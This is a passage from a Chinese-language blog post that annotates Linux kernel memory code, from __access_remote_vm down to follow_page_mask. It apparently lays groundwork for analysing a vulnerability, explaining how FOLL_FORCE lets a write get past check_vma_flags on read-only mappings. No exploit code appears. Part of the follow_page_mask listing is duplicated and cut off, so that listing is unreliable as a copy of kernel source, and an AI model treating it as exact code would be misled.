<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c">access_remote_vm-&gt;__access_remote_vm<br><span class="hljs-number">3645</span> <span class="hljs-comment">/*          </span><br><span class="hljs-comment">3646  * Access another process&#x27; address space as given in mm.  If non-NULL, use the</span><br><span class="hljs-comment">3647  * given task for page fault accounting.</span><br><span class="hljs-comment">	  * @tsk:从上一级函数可以看到这里实际上传递的NULL</span><br><span class="hljs-comment">	  * @mm:为file-&gt;private_data</span><br><span class="hljs-comment">	  * @addr:将要写入的虚拟地址</span><br><span class="hljs-comment">	  * @buf:mem_rw函数当中刚刚使用__get_free_pages获取到的新物理映射到的新内核虚拟地址</span><br><span class="hljs-comment">	  * @len:即将写入的长度</span><br><span class="hljs-comment">	  * @write:同上为1</span><br><span class="hljs-comment">3648  */</span>         <br><span class="hljs-number">3649</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> __access_remote_vm(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,<br><span class="hljs-number">3650</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">void</span> *buf, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> write)<br><span class="hljs-number">3651</span> &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * This struct defines a memory VMM memory area. There is one of these</span><br><span class="hljs-comment">     * per VM-area/task.  A VM area is any part of the process virtual memory</span><br><span class="hljs-comment">     * space that has a special rule for the page-fault handlers (ie a shared</span><br><span class="hljs-comment">     * library, the executable area etc). </span><br><span class="hljs-comment">     * 这里的注释为结构体(strcut vm_area_struct)</span><br><span class="hljs-comment">     */</span><br><span class="hljs-number">3652</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span><br><span class="hljs-number">3653</span>     <span class="hljs-type">void</span> *old_buf = buf;<br><span class="hljs-number">3654</span> <br>    	<span class="hljs-comment">/* lock for reading */</span><br><span class="hljs-number">3655</span>     down_read(&amp;mm-&gt;mmap_sem);<br><span class="hljs-number">3656</span>     <span class="hljs-comment">/* ignore errors, just check how much was successfully transferred */</span><br><span class="hljs-number">3657</span>     <span class="hljs-keyword">while</span> (len) &#123;<br><span class="hljs-number">3658</span>         <span class="hljs-type">int</span> bytes, ret, offset;<br><span class="hljs-number">3659</span>         <span class="hljs-type">void</span> *maddr;<br><span class="hljs-number">3660</span>         <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-number">3661</span> 				<span class="hljs-comment">/* 通过页表来获取addr对应的物理页面，也就是page结构体，这里同样返回了映射到的内核虚拟地址 */</span><br><span class="hljs-number">3662</span>         ret = get_user_pages(tsk, mm, addr, <span class="hljs-number">1</span>,<br><span class="hljs-number">3663</span>                 write, <span class="hljs-number">1</span>, &amp;page, &amp;vma);<br><span class="hljs-number">3664</span>         <span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-number">3665</span> <span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span><br><span class="hljs-number">3666</span>             <span class="hljs-keyword">break</span>;<br><span class="hljs-number">3667</span> <span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-number">3668</span>             <span class="hljs-comment">/*</span><br><span class="hljs-comment">3669              * Check if this is a VM_IO | VM_PFNMAP VMA, which</span><br><span class="hljs-comment">3670              * we can access using slightly different code.</span><br><span class="hljs-comment">3671              */</span><br><span class="hljs-number">3672</span>             vma = find_vma(mm, addr);<br><span class="hljs-number">3673</span>             <span class="hljs-keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)<br><span class="hljs-number">3674</span>                 <span class="hljs-keyword">break</span>;<br><span class="hljs-number">3675</span>             <span class="hljs-keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;access)<br><span class="hljs-number">3676</span>                 ret = vma-&gt;vm_ops-&gt;access(vma, addr, buf,<br><span class="hljs-number">3677</span>                               len, write);<br><span class="hljs-number">3678</span>             <span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>)<br><span class="hljs-number">3679</span>                 <span class="hljs-keyword">break</span>;<br><span class="hljs-number">3680</span>             bytes = ret; <br><span class="hljs-number">3681</span> <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-number">3682</span>         &#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-number">3683</span>             bytes = len;<br><span class="hljs-number">3684</span>             offset = addr &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);<br><span class="hljs-number">3685</span>             <span class="hljs-keyword">if</span> (bytes &gt; PAGE_SIZE-offset)<br><span class="hljs-number">3686</span>                 bytes = PAGE_SIZE-offset;<br><span class="hljs-number">3687</span> <br><span class="hljs-number">3688</span>             maddr = kmap(page);<br>				...<br><span class="hljs-number">3705</span> <br><span class="hljs-number">3706</span>     <span class="hljs-keyword">return</span> buf - old_buf;<br><span class="hljs-number">3707</span> &#125;<br><br></code></pre></td></tr></table></figure>

<p>这里主要讲解 <code>get_user_pages</code>函数，他是通过用户给出的虚拟地址从页表得到物理地址然后返回，这里传递的特殊的标识符为一个write&#x3D;1,和force&#x3D;1,这两个参数在后面体现为 <code>__get_user_pages</code>函数的参数<code>flags=FOLL_GET|FOLL_WRITE|FOLL_FORCE</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">855</span> <span class="hljs-type">long</span> <span class="hljs-title function_">get_user_pages</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,</span><br><span class="hljs-params"><span class="hljs-number">856</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages, <span class="hljs-type">int</span> write,</span><br><span class="hljs-params"><span class="hljs-number">857</span>         <span class="hljs-type">int</span> force, <span class="hljs-keyword">struct</span> page **pages, <span class="hljs-keyword">struct</span> vm_area_struct **vmas)</span><br>858 &#123;<br><span class="hljs-number">859</span>     <span class="hljs-keyword">return</span> __get_user_pages_locked(tsk, mm, start, nr_pages, write, force,                                                                                                              <br><span class="hljs-number">860</span>                        pages, vmas, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">false</span>, FOLL_TOUCH);<br><span class="hljs-number">861</span> &#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * @tsk:没变化，仍然传递的NULL</span><br><span class="hljs-comment"> * @mm:同上</span><br><span class="hljs-comment"> * @start:将要访问的用户虚拟地址</span><br><span class="hljs-comment"> * @nr_pages:指物理页框的数量，这里是传入来一个恒定的值，1</span><br><span class="hljs-comment"> * @write:1</span><br><span class="hljs-comment"> * @force:1</span><br><span class="hljs-comment"> * @pages:struct page 结构体的指针的地址</span><br><span class="hljs-comment"> * @vmas:struct vma_area_struct 结构体的指针的地址</span><br><span class="hljs-comment"> * @locked:传递NULL</span><br><span class="hljs-comment"> * @notify_drop:传递false</span><br><span class="hljs-comment"> * @flags:FOLL_TOUCH，值为0x02,官方注释为 mark page accessed</span><br><span class="hljs-comment">*/</span><br><span class="hljs-number">621</span> <span class="hljs-type">static</span> __always_inline <span class="hljs-type">long</span> __get_user_pages_locked(<span class="hljs-keyword">struct</span> task_struct *tsk,<br><span class="hljs-number">622</span>                         <span class="hljs-keyword">struct</span> mm_struct *mm,<br><span class="hljs-number">623</span>                         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start,<br><span class="hljs-number">624</span>                         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages,<br><span class="hljs-number">625</span>                         <span class="hljs-type">int</span> write, <span class="hljs-type">int</span> force,<br><span class="hljs-number">626</span>                         <span class="hljs-keyword">struct</span> page **pages,<br><span class="hljs-number">627</span>                         <span class="hljs-keyword">struct</span> vm_area_struct **vmas,<br><span class="hljs-number">628</span>                         <span class="hljs-type">int</span> *locked, <span class="hljs-type">bool</span> notify_drop,<br><span class="hljs-number">629</span>                         <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)<br><span class="hljs-number">630</span> &#123;<br><span class="hljs-number">631</span>     <span class="hljs-type">long</span> ret, pages_done;<br><span class="hljs-number">632</span>     <span class="hljs-type">bool</span> lock_dropped;<br><span class="hljs-number">633</span> <br>	     .....<br>       <span class="hljs-comment">/*</span><br><span class="hljs-comment">       #define FOLL_WRITE  0x01    check pte is writable </span><br><span class="hljs-comment">	#define FOLL_TOUCH  0x02    mark page accessed</span><br><span class="hljs-comment">	#define FOLL_GET    0x04    do get_page on page </span><br><span class="hljs-comment">	#define FOLL_FORCE  0x10    get_user_pages read/write w/o permission</span><br><span class="hljs-comment">	因此执行下面的操作后，flags值应该是 FOLL_WRITE|FOLL_TOUCH|FOLL_GET|FOLL_FORCE = 0x17</span><br><span class="hljs-comment">       */</span><br><span class="hljs-number">640</span> <br><span class="hljs-number">641</span>     <span class="hljs-keyword">if</span> (pages)<br><span class="hljs-number">642</span>         flags |= FOLL_GET;<br><span class="hljs-number">643</span>     <span class="hljs-keyword">if</span> (write)<br><span class="hljs-number">644</span>         flags |= FOLL_WRITE;<br><span class="hljs-number">645</span>     <span class="hljs-keyword">if</span> (force)<br><span class="hljs-number">646</span>         flags |= FOLL_FORCE;<br><span class="hljs-number">647</span>     <br><span class="hljs-number">648</span>     pages_done = <span class="hljs-number">0</span>;<br><span class="hljs-number">649</span>     lock_dropped = <span class="hljs-literal">false</span>;<br><span class="hljs-number">650</span>     <span class="hljs-keyword">for</span> (;;) &#123;<br><span class="hljs-number">651</span>         ret = __get_user_pages(tsk, mm, start, nr_pages, flags, pages,<br><span class="hljs-number">652</span>                        vmas, locked);<br><br><br></code></pre></td></tr></table></figure>

<p>该函数基本就是加了个锁状态防止同步，接下来我们来看 <code>__get_user_pages</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * @gup_flags:就是上面的flags,0x17</span><br><span class="hljs-comment"> * @nonblocking:为之前传递的locked,此时为0</span><br><span class="hljs-comment">*/</span><br><span class="hljs-number">453</span> <span class="hljs-type">long</span> __get_user_pages(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,<br><span class="hljs-number">454</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages,<br><span class="hljs-number">455</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> gup_flags, <span class="hljs-keyword">struct</span> page **pages,<br><span class="hljs-number">456</span>         <span class="hljs-keyword">struct</span> vm_area_struct **vmas, <span class="hljs-type">int</span> *nonblocking)<br><span class="hljs-number">457</span> &#123;<br><span class="hljs-number">458</span>     <span class="hljs-type">long</span> i = <span class="hljs-number">0</span>;<br><span class="hljs-number">459</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> page_mask;<br><span class="hljs-number">460</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-number">461</span> <br><span class="hljs-number">462</span>     <span class="hljs-keyword">if</span> (!nr_pages)<br><span class="hljs-number">463</span>         <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">464</span> <br><span class="hljs-number">465</span>     VM_BUG_ON(!!pages != !!(gup_flags &amp; FOLL_GET));<br><span class="hljs-number">466</span> <br><span class="hljs-number">467</span>     <span class="hljs-comment">/*</span><br><span class="hljs-comment">468      * If FOLL_FORCE is set then do not force a full fault as the hinting</span><br><span class="hljs-comment">469      * fault information is unrelated to the reference behaviour of a task</span><br><span class="hljs-comment">470      * using the address space</span><br><span class="hljs-comment">		  * 如果设置了 FOLL_FORCE，则不要强制发生完整故障，因为提示故障信息与使用地址空间的任务的引用行为无关</span><br><span class="hljs-comment">471      */</span><br><span class="hljs-number">472</span>     <span class="hljs-keyword">if</span> (!(gup_flags &amp; FOLL_FORCE))<br><span class="hljs-number">473</span>         gup_flags |= FOLL_NUMA;<br><span class="hljs-number">474</span> <br><span class="hljs-number">475</span>     <span class="hljs-keyword">do</span> &#123;<br>				...<br><span class="hljs-number">494</span>             <span class="hljs-keyword">if</span> (!vma || check_vma_flags(vma, gup_flags))<br><span class="hljs-number">495</span>                 <span class="hljs-keyword">return</span> i ? : -EFAULT;<br><span class="hljs-number">496</span>             <span class="hljs-keyword">if</span> (is_vm_hugetlb_page(vma)) &#123;<br><span class="hljs-number">497</span>                 i = follow_hugetlb_page(mm, vma, pages, vmas,<br><span class="hljs-number">498</span>                         &amp;start, &amp;nr_pages, i,<br><span class="hljs-number">499</span>                         gup_flags);<br><span class="hljs-number">500</span>                 <span class="hljs-keyword">continue</span>;<br><span class="hljs-number">501</span>             &#125;<br><span class="hljs-number">502</span>         &#125;<br><span class="hljs-number">503</span> retry:<br><span class="hljs-number">504</span>         <span class="hljs-comment">/*</span><br><span class="hljs-comment">505          * If we have a pending SIGKILL, don&#x27;t keep faulting pages and</span><br><span class="hljs-comment">506          * potentially allocating memory.</span><br><span class="hljs-comment">507          */</span><br><span class="hljs-number">508</span>         <span class="hljs-keyword">if</span> (unlikely(fatal_signal_pending(current)))<br><span class="hljs-number">509</span>             <span class="hljs-keyword">return</span> i ? i : -ERESTARTSYS;<br><span class="hljs-number">510</span>         cond_resched();<br><span class="hljs-number">511</span>         page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);<br><span class="hljs-number">512</span>         <span class="hljs-keyword">if</span> (!page) &#123;<br><span class="hljs-number">513</span>             <span class="hljs-type">int</span> ret;<br><span class="hljs-number">514</span>             ret = faultin_page(tsk, vma, start, &amp;foll_flags,<br><span class="hljs-number">515</span>                     nonblocking);<br><span class="hljs-number">516</span>             <span class="hljs-keyword">switch</span> (ret) &#123;<br><span class="hljs-number">517</span>             <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br><span class="hljs-number">518</span>                 <span class="hljs-keyword">goto</span> retry;<br><span class="hljs-number">519</span>             <span class="hljs-keyword">case</span> -EFAULT:                                                                        <br><span class="hljs-number">520</span>             <span class="hljs-keyword">case</span> -ENOMEM:<br><span class="hljs-number">521</span>             <span class="hljs-keyword">case</span> -EHWPOISON:<br><span class="hljs-number">522</span>                 <span class="hljs-keyword">return</span> i ? i : ret;<br><span class="hljs-number">523</span>             <span class="hljs-keyword">case</span> -EBUSY:<br><span class="hljs-number">524</span>                 <span class="hljs-keyword">return</span> i;<br><span class="hljs-number">525</span>             <span class="hljs-keyword">case</span> -ENOENT:<br><span class="hljs-number">526</span>                 <span class="hljs-keyword">goto</span> next_page;<br><span class="hljs-number">527</span>             &#125;<br><span class="hljs-number">528</span>             BUG();<br><span class="hljs-number">529</span>         &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (PTR_ERR(page) == -EEXIST) &#123;<br><span class="hljs-number">530</span>             <span class="hljs-comment">/*</span><br><span class="hljs-comment">531              * Proper page table entry exists, but no corresponding</span><br><span class="hljs-comment">532              * struct page.</span><br><span class="hljs-comment">533              */</span><br><span class="hljs-number">534</span>             <span class="hljs-keyword">goto</span> next_page;<br><span class="hljs-number">535</span>         &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (IS_ERR(page)) &#123;<br><span class="hljs-number">536</span>             <span class="hljs-keyword">return</span> i ? i : PTR_ERR(page);<br><span class="hljs-number">537</span>         &#125;<br><span class="hljs-number">538</span>         <span class="hljs-keyword">if</span> (pages) &#123;<br><span class="hljs-number">539</span>             pages[i] = page;<br><span class="hljs-number">540</span>             flush_anon_page(vma, page, start);<br><span class="hljs-number">541</span>             flush_dcache_page(page);<br><span class="hljs-number">542</span>             page_mask = <span class="hljs-number">0</span>;<br><span class="hljs-number">543</span>         &#125;<br><span class="hljs-number">544</span> next_page:<br><span class="hljs-number">545</span>         <span class="hljs-keyword">if</span> (vmas) &#123;<br><span class="hljs-number">546</span>             vmas[i] = vma;<br><span class="hljs-number">547</span>             page_mask = <span class="hljs-number">0</span>;<br><span class="hljs-number">548</span>         &#125;<br><span class="hljs-number">549</span>         page_increm = <span class="hljs-number">1</span> + (~(start &gt;&gt; PAGE_SHIFT) &amp; page_mask);<br><span class="hljs-number">550</span>         <span class="hljs-keyword">if</span> (page_increm &gt; nr_pages)<br><span class="hljs-number">551</span>             page_increm = nr_pages;<br><span class="hljs-number">552</span>         i += page_increm;<br><span class="hljs-number">553</span>         start += page_increm * PAGE_SIZE;<br><span class="hljs-number">554</span>         nr_pages -= page_increm;<br><span class="hljs-number">555</span>     &#125; <span class="hljs-keyword">while</span> (nr_pages);<br><span class="hljs-number">556</span>     <span class="hljs-keyword">return</span> i;<br><span class="hljs-number">557</span> &#125;<br><br></code></pre></td></tr></table></figure>

<p>该函数前面的部分体现了为什么要加上 <code>FOLL_FORCE</code>这个参数，当我们执行到一个检测函数 <code>check_vma_flags</code>的时候，如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">359</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">check_vma_flags</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> gup_flags)</span><br>360 &#123;<br><span class="hljs-number">361</span>     <span class="hljs-type">vm_flags_t</span> vm_flags = vma-&gt;vm_flags;<br><span class="hljs-number">362</span> <br><span class="hljs-number">363</span>     <span class="hljs-keyword">if</span> (vm_flags &amp; (VM_IO | VM_PFNMAP))<br><span class="hljs-number">364</span>         <span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-number">365</span> <br><span class="hljs-number">366</span>     <span class="hljs-keyword">if</span> (gup_flags &amp; FOLL_WRITE) &#123;<br><span class="hljs-number">367</span>         <span class="hljs-keyword">if</span> (!(vm_flags &amp; VM_WRITE)) &#123;<br><span class="hljs-number">368</span>             <span class="hljs-keyword">if</span> (!(gup_flags &amp; FOLL_FORCE))<br><span class="hljs-number">369</span>                 <span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-number">370</span>             <span class="hljs-comment">/*</span><br><span class="hljs-comment">371              * We used to let the write,force case do COW in a</span><br><span class="hljs-comment">372              * VM_MAYWRITE VM_SHARED !VM_WRITE vma, so ptrace could</span><br><span class="hljs-comment">373              * set a breakpoint in a read-only mapping of an</span><br><span class="hljs-comment">374              * executable, without corrupting the file (yet only</span><br><span class="hljs-comment">375              * when that file had been opened for writing!).</span><br><span class="hljs-comment">376              * Anon pages in shared mappings are surprising: now</span><br><span class="hljs-comment">377              * just reject it.</span><br><span class="hljs-comment">378              */</span><br><span class="hljs-number">379</span>             <span class="hljs-keyword">if</span> (!is_cow_mapping(vm_flags)) &#123;<br><span class="hljs-number">380</span>                 WARN_ON_ONCE(vm_flags &amp; VM_MAYWRITE);<br><span class="hljs-number">381</span>                 <span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-number">382</span>             &#125;<br>	...<br><span class="hljs-number">394</span>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">395</span> &#125;<br><br></code></pre></td></tr></table></figure>

<p>这里可以看到如果我们设置force参数，这样这里就不会报错</p>
<p>这里接着讲回到 <code>__get_user_pages</code>的retry部分，首先是通过<code>follow_page_mask</code>函数来获取对应用户虚拟地址所映射到的物理地址</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/3801213fb80e7bec1812dbd4692eb9389b506b3f.jpg" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">164</span> <span class="hljs-comment">/**</span><br><span class="hljs-comment">165  * follow_page_mask - look up a page descriptor from a user-virtual address</span><br><span class="hljs-comment">166  * @vma: vm_area_struct mapping @address</span><br><span class="hljs-comment">167  * @address: virtual address to look up</span><br><span class="hljs-comment">168  * @flags: flags modifying lookup behaviour</span><br><span class="hljs-comment">169  * @page_mask: on output, *page_mask is set according to the size of the page</span><br><span class="hljs-comment">170  *</span><br><span class="hljs-comment">171  * @flags can have FOLL_ flags set, defined in &lt;linux/mm.h&gt;</span><br><span class="hljs-comment">172  *</span><br><span class="hljs-comment">173  * Returns the mapped (struct page *), %NULL if no mapping exists, or                                                                                                                   </span><br><span class="hljs-comment">174  * an error pointer if there is a mapping to something not represented</span><br><span class="hljs-comment">175  * by a page descriptor (see also vm_normal_page()).</span><br><span class="hljs-comment">176  */</span><br><span class="hljs-number">177</span> <span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">follow_page_mask</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,                                         </span><br><span class="hljs-params"><span class="hljs-number">178</span>                   <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags,</span><br><span class="hljs-params"><span class="hljs-number">179</span>                   <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *page_mask)</span><br>180 &#123;<br><span class="hljs-number">181</span>     <span class="hljs-type">pgd_t</span> *pgd;<br><span class="hljs-number">182</span>     <span class="hljs-type">pud_t</span> *pud;<br><span class="hljs-number">183</span>     <span class="hljs-type">pmd_t</span> *pmd;<br><span class="hljs-number">184</span>     <span class="hljs-type">spinlock_t</span> *ptl;<br><span class="hljs-number">185</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-number">186</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br><span class="hljs-number">177</span> <span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">follow_page_mask</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,                                                                                                                               </span><br><span class="hljs-params"><span class="hljs-number">178</span>                   <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags,</span><br><span class="hljs-params"><span class="hljs-number">179</span>                   <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *page_mask)</span><br>180 &#123;<br><span class="hljs-number">181</span>     <span class="hljs-type">pgd_t</span> *pgd;<br><span class="hljs-number">182</span>     <span class="hljs-type">pud_t</span> *pud;<br><span class="hljs-number">183</span>     <span class="hljs-type">pmd_t</span> *pmd;<br><span class="hljs-number">184</span>     <span class="hljs-type">spinlock_t</span> *ptl;<br><span class="hljs-number">185</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-number">186</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br><span class="hljs-number">221</span>     <span class="hljs-keyword">if</span> ((flags &amp; FOLL_NUMA) &amp;&amp; 